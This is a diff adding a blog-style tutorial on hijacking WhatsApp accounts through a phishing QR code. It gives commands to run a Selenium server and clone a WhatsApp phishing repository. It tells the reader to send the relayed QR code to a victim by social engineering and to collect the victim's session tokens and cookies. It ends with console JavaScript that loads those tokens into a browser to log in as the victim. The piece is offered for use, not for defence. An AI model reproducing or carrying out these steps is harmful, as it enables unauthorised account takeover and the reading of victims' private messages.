@@ -1,0 +1,54 @@
+
+Hack anyone’s Whatsapp through QR code (Working)
+
+Recently Whatsapp has released a new important update for their Whatsapp users that is End-to-End Encryption, means it’s impossible to decrypt this type of encryption even Whatsapp can’t decrypt it. This is really good news for every Whatsapp users.
+But remember “Security is just an illusion” I’m saying this because there is a way by which whatsapp can be hacked and that is by phishing method.
+So let’s start first download Selenium standalone server jar file from here
+Then open terminal change directory where you downloaded that Selenium server file in my case I downloaded it on my Desktop.
+Cd /root/Desktop/
+
+
+Then type:
+./selenium-server-standalone-2.53.0.jar
+
+Now it will start the selenium server. Then open a new terminal and type:
+git clone https://github.com/Mawalu/whatsapp-phishing.git
+
+It will clone repository of whatsapp-phishingfromGithub. After that type:
+cd whatsapp-phishing
+Thentype:
+npm install
+
+It will install all required things like node.js and socket.io which is required to run website and selenium server. If you encounter any “missing” error then you have to install it manually, toinstall missing part manually type:
+npm install node.js
+npm install socket.io
+npm install wd
+After installingtype in terminal:
+node index.js
+
+It willstart http and a socket.io server
+Now open your MozillaFirefox and type in address bar:
+http://localhost:8080
+When you press enter, it will open a new browser and connect to the web.whatsapp.com and will generate a QR code in the browser. The generated phishing QR code will continuously sync with web.whatsapp.com QR code.
+
+Now send this QR code to a victim through social engineering method, when victim scan that QR code through their mobile Whatsapp scanner then Whatsapp will authenticate the browser which is controlled by selenium server and then fetch tokens and document.cookie from victims Whatsapp.
+Now you have to copy tokens and document.cookie, to see stored tokens and document.cookiethere are two ways
+/root/whatsapp-phishing/
+In whatsapp-phishing directory a file namedsecrets will be created automatically when victim scan that phishing QR code and that file contains token ID and document.cookie
+
+Second way is go the terminal where js is running already, there you will find that some codes are fetched that is our goddam gold means victim token ID that’s what we require to get access to his/her Whatsapp account.
+
+In both the ways you will find there are multiple token IDs fetched but we only want latest fetched token ID and document.cookie. So to do so copy lastfetched token  which startswith {“s”: and end with   “c”:””} . See the picture for reference.
+Then open Firefoxbrowser as incognito mode and then open link https://web.whatsapp.com/
+After that open developers mode in browser and go to console and type
+var t = PASTE_HERE _VICTIM_TOKEN-ID
+
+Then type following code:
+> function login(token) {Object.keys(token.s).forEach(function (key) {localStorage.setItem(key, token.s[key])}); token.c = token.c.split(‘;’); token.c.forEach(function(cookie) {document.cookie = cookie; });}
+And at last type:
+>login (t)
+Now reload the browser window and wait. Bannggg!!automatically after few seconds you will be logged in as the person who scanned the QR code (phishing QR code that we have created.)
+
+Enjoy. Stay tuned for more tutorials like this.
+AUTHOR: AkshayBhardwaj is an Information Security Enthusiast and Researcher | Sketch Artist |Technical writer.
+facebook
